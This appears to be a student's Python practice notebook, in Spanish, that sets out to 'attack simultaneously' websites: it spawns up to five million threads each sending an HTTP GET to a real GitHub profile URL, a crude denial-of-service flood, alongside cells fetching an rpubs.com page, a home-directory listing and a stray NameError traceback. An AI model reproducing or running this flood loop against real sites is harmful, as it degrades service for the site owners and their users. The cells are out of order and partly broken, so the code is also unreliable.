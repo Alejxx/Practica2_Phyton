{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3e8ab52a-568c-4d70-b59e-f5a6fdf48867",
   "metadata": {},
   "source": [
    "# Tercer programa"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6e92cf81-bcb7-45ba-9559-3653cda7262e",
   "metadata": {},
   "source": [
    "## Se solicita realizar ataques simultáneos a los siguientes sitios web."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "4f8ad567-e0d4-4304-bc21-5c5fba1bdabf",
   "metadata": {},
   "outputs": [],
   "source": [
    "import threading, os, platform, requests, json # , para añadir varios"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "43a8e6c8-8d57-42f3-aee6-a0627caba65b",
   "metadata": {},
   "outputs": [],
   "source": [
    "numero_de_veces_hasta_martar_uem = 5_000_000"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e6d5288b-6e1e-4f8b-9971-48f8b0041c73",
   "metadata": {},
   "source": [
    "## HTTP CODES"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "dd93f7db-a1e0-4760-b08c-609e534127e5",
   "metadata": {},
   "outputs": [],
   "source": [
    "from IPython import display"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "fcc3b906-a5a9-4b2a-851b-5242a9e93430",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "display.Image(\"Imagen.png\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "1871d5de-a5b5-43ba-bd5d-89f72aecd887",
   "metadata": {},
   "outputs": [],
   "source": [
    "url_=\"https://github.com/sukuzhanay\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "a3e4b371-238c-4e46-8201-3703c0b5a76a",
   "metadata": {
    "collapsed": true,
    "jupyter": {
     "outputs_hidden": true
    },
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " El volumen de la unidad C es OS\n",
      " El número de serie del volumen es: 1C29-8DA8\n",
      "\n",
      " Directorio de C:\\Users\\alejx\n",
      "\n",
      "30/09/2021  17:26    <DIR>          .\n",
      "30/09/2021  17:26    <DIR>          ..\n",
      "29/09/2021  18:54    <DIR>          .cache\n",
      "30/09/2021  17:27    <DIR>          .conda\n",
      "23/09/2021  16:21                25 .condarc\n",
      "23/09/2021  16:21    <DIR>          .continuum\n",
      "29/09/2021  18:54    <DIR>          .eclipse\n",
      "30/09/2021  16:17    <DIR>          .ipynb_checkpoints\n",
      "23/09/2021  16:34    <DIR>          .ipython\n",
      "23/09/2021  17:09    <DIR>          .jupyter\n",
      "29/09/2021  18:54    <DIR>          .p2\n",
      "24/09/2021  15:42    <DIR>          .vscode\n",
      "23/09/2021  12:16    <DIR>          3D Objects\n",
      "23/09/2021  16:20    <DIR>          anaconda3\n",
      "23/09/2021  12:16    <DIR>          Contacts\n",
      "23/09/2021  12:18    <DIR>          Documents\n",
      "30/09/2021  17:25    <DIR>          Downloads\n",
      "29/09/2021  18:18    <DIR>          eclipse\n",
      "29/09/2021  18:54    <DIR>          eclipse-workspace\n",
      "29/09/2021  18:10             9.892 Ej2_Alejandro_22056791.ipynb\n",
      "30/09/2021  17:26            23.032 Ej3.ipynb\n",
      "23/09/2021  12:16    <DIR>          Favorites\n",
      "25/09/2021  00:01           131.431 HolaMundo.exe\n",
      "30/09/2021  16:33             8.660 Imagen.png\n",
      "23/09/2021  12:16    <DIR>          Links\n",
      "23/09/2021  12:16    <DIR>          Music\n",
      "30/09/2021  15:51    <DIR>          OneDrive\n",
      "29/09/2021  17:47               844 Práctica2.ipynb\n",
      "29/09/2021  17:58            13.872 Práctica2_Alejandro_González.ipynb\n",
      "23/09/2021  12:16    <DIR>          Saved Games\n"
     ]
    }
   ],
   "source": [
    "ls"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "97836712-94ac-464c-a219-d444620bd29e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "23/09/2021  12:17    <DIR>          Searches\n",
      "23/09/2021  17:11             1.218 Untitled.ipynb\n",
      "24/09/2021  15:22    <DIR>          Videos\n",
      "29/09/2021  21:03    <DIR>          Visual Studio Proyectos\n",
      "               8 archivos        188.974 bytes\n",
      "              26 dirs  444.593.225.728 bytes libres\n"
     ]
    }
   ],
   "source": [
    "def matar_uem():\n",
    "    print(requests.get(url_))\n",
    "    threading.current_thread()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4a5310ed-55d9-4524-92bf-296ba82b2bb7",
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(numero_de_veces_hasta_martar_uem):\n",
    "    threading.Thread(target=matar_uem).start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "37c0f47d-2a2d-48fd-a31a-1d5749e83cf3",
   "metadata": {},
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 'url_' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-2-4435babb23e1>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[1;32m----> 1\u001b[1;33m \u001b[0mopen\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0murl_\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;34m'wb'\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mwrite\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mr\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mcontent\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m: name 'url_' is not defined"
     ]
    }
   ],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "4f6f096f-38d3-4a70-a9e4-a46ab8c1fbae",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Date': 'Thu, 30 Sep 2021 14:35:39 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Transfer-Encoding': 'chunked', 'Connection': 'keep-alive', 'Status': '200 OK', 'Cache-Control': 'max-age=0, private, must-revalidate', 'Referrer-Policy': 'strict-origin-when-cross-origin', 'X-Permitted-Cross-Domain-Policies': 'none', 'X-XSS-Protection': '1; mode=block', 'X-Request-Id': 'afd67595-3a7c-424a-b5fb-73dde25e944f', 'X-Download-Options': 'noopen', 'ETag': 'W/\"edeac3ee6b3d28343f67cb9e8d78e4f6\"', 'X-Frame-Options': 'SAMEORIGIN', 'X-Runtime': '0.049879', 'X-Content-Type-Options': 'nosniff', 'Set-Cookie': '_session_id=2d436f9b05b65933390b99de831dac12; path=/; HttpOnly', 'X-Powered-By': 'Phusion Passenger 6.0.2', 'Server': 'nginx/1.14.0 + Phusion Passenger 6.0.2', 'Content-Encoding': 'gzip'}"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "res_.headers"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "522ffc6f-8448-41bc-a57f-51062c314d89",
   "metadata": {},
   "outputs": [],
   "source": [
    "res_=requests.get(\"https://rpubs.com/christian_sucuzhanay\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "a45ffd49-f3d0-49ff-b573-4931e16bafea",
   "metadata": {},
   "outputs": [],
   "source": [
    "html = res_.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ca161dd4-dd77-4173-be88-f0806bfec8fc",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
